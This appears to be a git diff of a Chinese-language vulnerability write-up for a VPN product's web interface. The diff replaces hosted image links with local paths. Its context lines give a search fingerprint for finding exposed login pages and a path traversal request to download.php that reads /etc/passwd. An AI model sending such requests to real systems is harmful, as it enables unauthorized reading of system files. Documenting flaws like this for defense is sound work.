@@ -20,11 +20,11 @@ body="Get_Verify_Info(hex_md5(user_string)."
 
 登录页面如下
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202162251851.png)
+![](./images/202202162251851.png)
 
 漏洞存在于 download.php
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202162251009.png)
+![](./images/202202162251009.png)
 
 
 
@@ -34,4 +34,4 @@ body="Get_Verify_Info(hex_md5(user_string)."
 /download.php?&class=vpn&toolname=../../../../../../../../etc/passwd
 ```
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202162251674.png)
+![](./images/202202162251674.png)
